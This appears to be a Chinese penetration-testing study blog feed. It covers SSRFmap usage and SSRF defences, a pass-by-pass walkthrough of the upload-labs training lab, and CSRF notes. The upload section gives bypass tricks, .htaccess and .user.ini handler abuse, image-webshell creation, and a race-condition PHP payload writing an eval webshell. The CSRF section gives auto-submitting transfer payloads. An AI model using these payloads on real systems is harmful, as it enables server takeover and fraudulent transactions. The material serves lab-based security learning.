ssrfmap.py [-h] [-r REQFILE] [-p PARAM] [-m MODULES] [-l HANDLER]                    [-v [VERBOSE]] [--lhost LHOST] [--lport LPORT]                    [--uagent USERAGENT] [--ssl [SSL]] [--level [LEVEL]]  optional arguments:    -h, --help          show this help message and exit    -r REQFILE          SSRF Request file    -p PARAM            SSRF Parameter to target    -m MODULES          SSRF Modules to enable    -l HANDLER          Start an handler for a reverse shell    -v [VERBOSE]        Enable verbosity    --lhost LHOST       LHOST reverse shell    --lport LPORT       LPORT reverse shell    --uagent USERAGENT  User Agent to use    --ssl [SSL]         Use HTTPS without verification    --proxy PROXY       Use HTTP(s) proxy (ex: http://localhost:8080)    --level [LEVEL]     Level of test to perform (1-5, default: 1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="如何防御SSRF漏洞"><a href="#如何防御SSRF漏洞" class="headerlink" title="如何防御SSRF漏洞"></a>如何防御SSRF漏洞</h1><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol><li>禁用协议 </li><li>限制请求端口 </li><li>设置URL白名单 </li><li>过滤返回信息 </li><li>统一错误信息</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/13-wen-jian-shang-chuan/upload-labs/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/13-wen-jian-shang-chuan/upload-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传靶场安装"><a href="#文件上传靶场安装" class="headerlink" title="文件上传靶场安装"></a>文件上传靶场安装</h1><p><a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p><h1 id="打开靶场"><a href="#打开靶场" class="headerlink" title="打开靶场"></a>打开靶场</h1><p><a href="http://192.168.31.193:7298/">http://192.168.31.193:7298/</a></p><h1 id="pass1"><a href="#pass1" class="headerlink" title="pass1"></a>pass1</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token operator">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">.</span>value<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用javascript验证文件后缀，禁用掉浏览器js,完成上传。</p><h2 id="JS前端验证"><a href="#JS前端验证" class="headerlink" title="JS前端验证"></a><strong>JS前端验证</strong></h2><p>漏洞描述：利用前端 JS 对上传文件后缀进行校验，后端没进行检测 </p><p>利用方法：</p><ol><li><p>浏览器<strong>禁用 js</strong></p></li><li><p>使用浏览器的开发者工具<strong>删掉提交时调用js的函数</strong>。</p></li><li><p>burp抓包 先上传白名单文件，再用 burp在<strong>Content-Type</strong> <strong>修改上传<em>文件后缀</em></strong></p></li></ol><h1 id="pass2"><a href="#pass2" class="headerlink" title="pass2"></a>pass2</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>判断文件类型，设置<strong>白名单</strong>，只允许<strong>image/jpeg</strong>，<strong>image/png</strong>，<strong>image/gif</strong>类型的图片上传。</p><p>burpsuite抓包，修改要上传文件的<strong>Content-Type</strong>类型为这里指定的文件类型。</p><p><img src="assets/image-20221122163416253.png" alt="image-20221122163416253"></p><p>将content-type修改为image/png，</p><p><img src="assets/image-20221122163451618.png" alt="image-20221122163451618"></p><p>文件上传成功。</p><h1 id="pass3"><a href="#pass3" class="headerlink" title="pass3"></a>pass3</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.asp'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.aspx'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.jsp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//首尾去空</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对扩展后缀使用<strong>黑名单</strong>，但是不全，尝试使用<strong>等价扩展名</strong></p><p>例如，传的文件是php，那么它的等价扩展名为php3，php4等等</p><p><img src="assets/image-20221122164841666.png" alt="image-20221122164841666"></p><p>同样将content-type修改为image/png，</p><p><img src="assets/image-20221122164910783.png" alt="image-20221122164910783"></p><p>上传成功。将图片在新标签也打开，发现<strong>图片被重命名</strong>了。</p><p><img src="assets/image-20221122205041349.png" alt="image-20221122205041349"></p><p>将图片右键在新标签页打开</p><p><img src="assets/image-20221122205456474.png" alt="image-20221122205456474"></p><p><a href="http://192.168.31.193:7298/upload/202211222050584341.php3">http://192.168.31.193:7298/upload/202211222050584341.php3</a></p><p>使用蚁剑连接</p><p><img src="assets/image-20221122211217281.png" alt="image-20221122211217281"></p><p>连接成功</p><h1 id="pass4"><a href="#pass4" class="headerlink" title="pass4"></a>pass4</h1><pre class="line-numbers language-none"><code class="language-none">if (file_exists(UPLOAD_PATH)) {       $deny_ext = array(".php",".php5",".php4",".php3",".php2",".php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".ini");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>黑名单十分丰富，使用**.htaccess**改变文件扩展名。</p><p><strong>上传.htaccess 解析文件</strong>，利用其配置，将白名单文件的类型解析成 php 文件类型。</p><p>将服务器上的 1.jpg 文件解析成 php 文件.</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;FilesMatch "1.jpg"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>再上传一个一句话木马</strong>，文件名为 1.jpg，依旧访问 1.jpg，但其会以 php 形式显示</p><p><img src="assets/image-20221122211439276.png" alt="image-20221122211439276"></p><p>连接成功</p><h1 id="pass5"><a href="#pass5" class="headerlink" title="pass5"></a>pass5</h1><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">$deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");$file_ext = strtolower($file_ext); //转换为小写<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>将.htaccess也禁用掉了</p><p>利用**.user.ini** 配置文件，</p><p>.user.ini 相当于一个用 户自定义的 php.ini</p><p>上传文件 <strong>.user.ini</strong></p><p>内容为： </p><p><code>auto_prepend_file=2.jpg</code> </p><p>再上传一个内容为 php 一句话脚本，命名为 2.jpg。</p><p>.user.ini 文件作用：</p><p>所有的 php 文件都自动包含 2.jpg 文件。</p><h1 id="pass6"><a href="#pass6" class="headerlink" title="pass6"></a>pass6</h1><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">$deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>黑名单新增.ini配置文件，</p><p>但是这关没有使用<strong>strtolower()<strong>函数对</strong>大小写</strong>进行限制。</p><p>将文件名改成大写：<strong>1.PHP</strong></p><p>上传文件后，文件被重命名为<strong>202211221856456857.PHP</strong></p><p><a href="http://192.168.31.193:7298/upload/202211222050584341.php3">http://192.168.31.193:7298/upload/202211222050584341.php3</a></p><p>使用蚁剑连接，连接成功</p><h1 id="pass7"><a href="#pass7" class="headerlink" title="pass7"></a>pass7</h1><p>访问<a href="http://192.168.31.193:8089/Pass-07/index.php">http://192.168.31.193:8089/Pass-07/index.php</a></p><pre class="line-numbers language-none"><code class="language-none">$file_name = deldot($file_name);//删除文件名末尾的点$file_ext = strrchr($file_name, '.');$file_ext = strtolower($file_ext); //转换为小写$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>本关没有<strong>trim()<strong>函数，首尾去</strong>空格</strong></p><p>因为windows不能在扩展名添空格，会被删除；只能bripsuite抓包在后缀名后添加空格：<strong>1.php</strong> （使用php5.3.29版本复现的）</p><p><img src="assets/image-20221122215554928.png" alt="image-20221122215554928"></p><p>上传成功,连接**202211230600234539.php **</p><p><img src="assets/image-20221122220048550.png" alt="image-20221122220048550"></p><p><img src="assets/image-20221122220205776.png" alt="image-20221122220205776"></p><p>文件上传成功，后缀名后的空格消失，成功上传了php文件。</p><h1 id="pass8"><a href="#pass8" class="headerlink" title="pass8"></a>pass8</h1><p>访问<a href="http://192.168.31.193:8089/Pass-08/index.php">http://192.168.31.193:8089/Pass-08/index.php</a></p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">$file_ext = strrchr($file_name, '.');$file_ext = strtolower($file_ext); //转换为小写$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA$file_ext = trim($file_ext); //首尾去空<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>本关<strong>deldot()函数</strong>没有<strong>删除文件名末尾去点</strong></p><p>抓包在php后缀名后加一个点绕过：<strong>1.php.</strong></p><p><img src="assets/image-20221123101058484.png" alt="image-20221123101058484"></p><p><img src="assets/image-20221123101957020.png" alt="image-20221123101957020"></p><p>上传成功，网页空白，被当作代码执行了。</p><p><img src="assets/image-20221123102159777.png" alt="image-20221123102159777"></p><p>上传成功的文件，后面的点也被自动删除。</p><h1 id="pass9"><a href="#pass9" class="headerlink" title="pass9"></a>pass9</h1><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">$file_name = deldot($file_name);//删除文件名末尾的点$file_ext = strrchr($file_name, '.');$file_ext = strtolower($file_ext); //转换为小写$file_ext = trim($file_ext); //首尾去空<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这一关没有<strong>str_ireplace()<strong>函数</strong>去除字符串::$DATA</strong></p><p>没有这个限制，就添加这个<code>::$DATA</code>字符串上去</p><p><code>1.php::$DATA</code></p><p><img src="assets/image-20221123103656056.png" alt="image-20221123103656056"></p><p><img src="assets/image-20221123104003841.png" alt="image-20221123104003841"></p><p>上传成功后，发现无法访问，可能后缀后的字符串在上传成功后被删除了；</p><p>删除后面的<code>::$DATA</code>，再次访问，</p><p><img src="assets/image-20221123104204581.png" alt="image-20221123104204581"></p><p>成功访问，也被当做代码被执行。</p><h1 id="pass10"><a href="#pass10" class="headerlink" title="pass10"></a>pass10</h1><pre class="line-numbers language-none"><code class="language-none">$file_name = deldot($file_name);//删除文件名末尾的点$file_ext = strrchr($file_name, '.');$file_ext = strtolower($file_ext); //转换为小写$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA$file_ext = trim($file_ext); //首尾去空<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这关没有缺什么函数，尝试其他思路</p><p>代码顺序是先删除一个点和在删除一个空格，那尝试多添加一个点：<strong>点，空格，点</strong>这样后缀名后会剩一个点，然后就绕过黑名单。</p><p><code>1.php. .</code></p><p><img src="assets/image-20221123105324928.png" alt="image-20221123105324928"></p><h1 id="pass11"><a href="#pass11" class="headerlink" title="pass11"></a>pass11</h1><pre class="line-numbers language-none"><code class="language-none">$file_name = str_ireplace($deny_ext,"", $file_name);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>本关没有之前的处理函数，但是增加了<strong>str_ireplace()<strong>函数：若匹配上了黑名单的后缀名，则直接</strong>删除后缀名</strong>，替换为空。</p><p>尝试<strong>双写</strong>后缀名<code>1.pphphp</code></p><p><img src="assets/image-20221123110603709.png" alt="image-20221123110603709"></p><p><img src="assets/image-20221123110637203.png" alt="image-20221123110637203"></p><p>上传成功</p><h1 id="pass12"><a href="#pass12" class="headerlink" title="pass12"></a>pass12</h1><pre class="line-numbers language-none"><code class="language-none">$img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用<strong>save_path</strong>路径保存</p><p>抓包查看是什么样子的</p><p><img src="assets/image-20221123140759549.png" alt="image-20221123140759549"></p><p>保存在upload目录下，使用<strong>文件名截断</strong>%00，控制读取的路径。</p><p><strong>get型00截断</strong>：<code>1.php%00</code></p><p><img src="assets/image-20221123141407395.png" alt="image-20221123141407395"></p><p>图片改为1.jpg</p><p><img src="assets/image-20221123141432715.png" alt="image-20221123141432715"></p><h1 id="pass13"><a href="#pass13" class="headerlink" title="pass13"></a>pass13</h1><pre class="line-numbers language-none"><code class="language-none">$img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>post型00截断</strong>，需要在 <strong>16 进制中修改</strong>，因为 POST 不会像 GET 那 样对%00 进行自动解码。</p><p><img src="assets/image-20221123144043894.png" alt="image-20221123144043894"></p><p><img src="assets/image-20221123144302559.png" alt="image-20221123144302559"></p><h1 id="pass14"><a href="#pass14" class="headerlink" title="pass14"></a>pass14</h1><p><img src="assets/image-20221123152221141.png" alt="image-20221123152221141"></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">getReailFileType</span><span class="token punctuation">(</span><span class="token parameter">$filename</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    $file <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>$filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    $bin <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span>$file<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//只读2字节</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>getReailFileType()<strong>函数</strong>读取文件头</strong>前两个字节。判断文件类型，利用<strong>图片马</strong>绕过检查</p><h2 id="图片马制作"><a href="#图片马制作" class="headerlink" title="图片马制作"></a>图片马制作</h2><p>在 cmd 里执行 <code>copy 1.gif/b+1.PHP/a 2.gif</code> </p><ul><li>1.jpg 为任意图片 </li><li>1.php 为我们要插入的木马代码 </li><li>2.jpg 为我们要创建的图片马 </li><li><img src="assets/image-20221123150533056.png" alt="image-20221123150533056"></li></ul><p>使用文件包含漏洞，</p><p><img src="assets/image-20221123152238096.png" alt="image-20221123152238096"></p><p><a href="http://192.168.31.193:8089/include.php?file=upload/5920221123150637.gif">http://192.168.31.193:8089/include.php?file=upload/5920221123150637.gif</a></p><h1 id="pass15"><a href="#pass15" class="headerlink" title="pass15"></a>pass15</h1><pre class="line-numbers language-none"><code class="language-none">$info = getimagesize($filename);$ext = image_type_to_extension($info[2]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>getimagesize()<strong>函数</strong>获取图片大小</strong>，由此来判断是不是一个有效的图片。</p><p>依旧上传上一个的图片码，利用提供的文件包含漏洞接口，连接蚁剑。</p><h1 id="pass16"><a href="#pass16" class="headerlink" title="pass16"></a>pass16</h1><pre class="line-numbers language-none"><code class="language-none">//需要开启php_exif模块$image_type = exif_imagetype($filename);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>exif_imagetype()<strong>函数自动读取</strong>图片的第一个字节并检查其签名</strong>，来判断文件类型。</p><p>同样上传图片码</p><h1 id="pass17"><a href="#pass17" class="headerlink" title="pass17"></a>pass17</h1><pre class="line-numbers language-none"><code class="language-none">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径   $filename = $_FILES['upload_file']['name'];   $filetype = $_FILES['upload_file']['type'];   $tmpname = $_FILES['upload_file']['tmp_name'];   $target_path=UPLOAD_PATH.'/'.basename($filename);   // 获得上传文件的扩展名   $fileext= substr(strrchr($filename,"."),1);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这关会获取文件扩展名。综合判断了后缀名、content-type，</p><p>以及利用 <strong>imagecreatefromgif</strong> 判断是否为 gif 图片，并在最后对文件内容进行了<strong>二次渲染</strong>，修改文件内容 </p><p>上传一个 GIF 图片马，然后将其下载下来，</p><p>查看其十六进制的文件内容， 找到二次渲染后不变的地方，</p><p>而这个地方就是可以插入一句话的地方</p><h1 id="pass18"><a href="#pass18" class="headerlink" title="pass18"></a>pass18</h1><pre class="line-numbers language-none"><code class="language-none">if(isset($_POST['submit'])){    $ext_arr = array('jpg','png','gif');    $file_name = $_FILES['upload_file']['name'];    $temp_file = $_FILES['upload_file']['tmp_name'];    $file_ext = substr($file_name,strrpos($file_name,".")+1);    $upload_file = UPLOAD_PATH . '/' . $file_name;    if(move_uploaded_file($temp_file, $upload_file)){        if(in_array($file_ext,$ext_arr)){             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;             rename($upload_file, $img_path);             $is_upload = true;        }else{            $msg = "只允许上传.jpg|.png|.gif类型文件！";            unlink($upload_file);        }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>会将图片路径移动，并且删除上传的文件。</p><p>但是判断到删除有时间差，在php文件还没有被删除，然后<strong>再产生新的php文件</strong>。</p><p>条件竞争:利用代码执行的时间差，产生新的文件。</p><p>上传competition.php文件，</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span> wuya<span class="token operator">.</span>php<span class="token string single-quoted-string">' , '</span>w <span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php @eval($_POST[ "wuya"])?&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>burpsuite抓包使用intruder模块<strong>不断发包上传</strong>php文件。</p><p><img src="assets/image-20221123163555707.png" alt="image-20221123163555707"></p><p>同样使用burpsuite抓包<strong>不断访问</strong><a href="http://192.168.31.193:7298/upload/competition.php%EF%BC%8C%E8%A7%A6%E5%8F%91php%E6%96%87%E4%BB%B6%EF%BC%8C**%E4%BA%A7%E7%94%9F%E6%96%B0%E7%9A%84php%E6%96%87%E4%BB%B6**%E3%80%82">http://192.168.31.193:7298/upload/competition.php，触发php文件，**产生新的php文件**。</a></p><p><img src="assets/image-20221123165255899.png" alt="image-20221123165255899"></p><p>连接成功</p><h1 id="pass19"><a href="#pass19" class="headerlink" title="pass19"></a>pass19</h1><pre class="line-numbers language-none"><code class="language-none">require_once("./myupload.php");$imgFileName =time();var $cls_arr_ext_accepted = array(".doc", ".xls", ".txt", ".pdf", ".gif", ".jpg", ".zip", ".rar", ".7z",".ppt",".html", ".xml", ".tiff", ".jpeg", ".png" );switch ($status_code) {        case 1:            $is_upload = true;            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;            break;        case 2:            $msg = '文件已经被上传，但没有重命名。';            break;         case -1:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用白名单，如果文件上传的过快，<strong>还没来得及重命名</strong>，文件名将被保留</p><p><code>1.php.7z</code></p><p>Apache2.4 的<strong>解析漏洞</strong>会将<code>.php.*</code>当中php代码执行</p><h1 id="pass20"><a href="#pass20" class="headerlink" title="pass20"></a>pass20</h1><pre class="line-numbers language-none"><code class="language-none">$deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");        $file_name = $_POST['save_name'];        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);        if(!in_array($file_ext,$deny_ext)) {            $temp_file = $_FILES['upload_file']['tmp_name'];            $img_path = UPLOAD_PATH . '/' .$file_name;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用黑名单，逻辑漏洞，使用 <strong>pathinfo()函数</strong>从<strong>最后一个小数点进行截取</strong>方式检查文件名后缀</p><p>在文件名后缀加一个小数点绕过 <code>1.php.</code>，</p><p>上传成功可以直接访问 1.php</p><h1 id="pass21"><a href="#pass21" class="headerlink" title="pass21"></a>pass21</h1><pre class="line-numbers language-none"><code class="language-none">if(!in_array($_FILES['upload_file']['type'],$allow_type)){        $msg = "禁止上传该类型文件!";    }else{        //检查文件名        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];        if (!is_array($file)) {            $file = explode('.', strtolower($file));        }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对参数$file 进行判断，如果不是，将其修改为<strong>数组</strong></p><p><strong>提前传入数组</strong>时，造成漏洞</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/12csrf/csrf-lou-dong/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/12csrf/csrf-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="大纲"><a href="#大纲" class="headerlink" title="大纲"></a>大纲</h1><ol><li>什么是CSRF漏洞？</li><li>CSRF案例分析 </li><li>CSRF漏洞挖掘 </li><li>CSRF漏洞防御</li></ol><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>Cross-Site Request Forgery </p><p>跨站请求伪造</p><p>第三方网站利用被攻击网站<strong>生效的cookie</strong>,直接对服务器接口发起请求</p><h1 id="CSRF实现流程"><a href="#CSRF实现流程" class="headerlink" title="CSRF实现流程"></a>CSRF实现流程</h1><p><img src="assets/image-20221121145522952.png" alt="image-20221121145522952"></p><h1 id="CSRF案例分析"><a href="#CSRF案例分析" class="headerlink" title="CSRF案例分析"></a>CSRF案例分析</h1><p>Gmail CSRF漏洞（设置邮件转发） </p><p>Weibo CSRF漏洞（自动关注账号）</p><h1 id="CSRF漏洞危害"><a href="#CSRF漏洞危害" class="headerlink" title="CSRF漏洞危害"></a>CSRF漏洞危害</h1><p>例如：</p><ul><li>修改账户信息 </li><li>利用管理员账号，上传木马文件 </li><li>传播蠕虫病毒（点击、扩散、点击……） </li><li>和其他攻击手段配合，实现攻击，比如XSS、SQL注入</li></ul><h2 id="XSS漏洞危害"><a href="#XSS漏洞危害" class="headerlink" title="XSS漏洞危害"></a>XSS漏洞危害</h2><ul><li>获取cookie，实现冒充身份的后续操作 </li><li>刷点击 </li><li>弹广告 </li><li>传播蠕虫病</li></ul><h2 id="CSRF与XSS区别"><a href="#CSRF与XSS区别" class="headerlink" title="CSRF与XSS区别"></a>CSRF与XSS区别</h2><p><img src="assets/image-20221121145550382.png" alt="image-20221121145550382"></p><h1 id="CSRF-payload"><a href="#CSRF-payload" class="headerlink" title="CSRF payload"></a>CSRF payload</h1><ul><li>通过<strong>图片</strong>的img src属性，<strong>自动</strong>加载，发起<strong>GET</strong>请求</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;img src="http://192.168.31.193:8087/transfer.php?nameid=1102&amp;amount=1000" width= "0" height="0"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>构建一个<strong>超链接</strong>，用户<strong>点击</strong>以后，发起GET请求</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>http://192.168.31.193:8087/transfer.php?amount=1000&amp;to=jiangang<span class="token punctuation">"</span></span> <span class="token attr-name">taget</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>小姐姐在线视频聊天！！<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">/&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>构建一个<strong>隐藏表单</strong>，用户访问，<strong>自动</strong>提交，发起<strong>POST</strong>请求</p><pre class="line-numbers language-none"><code class="language-none">&lt;form action="http://superbank.com/withdraw" method=POST&gt;&lt;input type="hidden" name="account" value="xiaoming" /&gt;&lt;input type="hidden" name="amount" value="1000" /&gt;&lt;input type="hidden" name="to" value="jiangang" 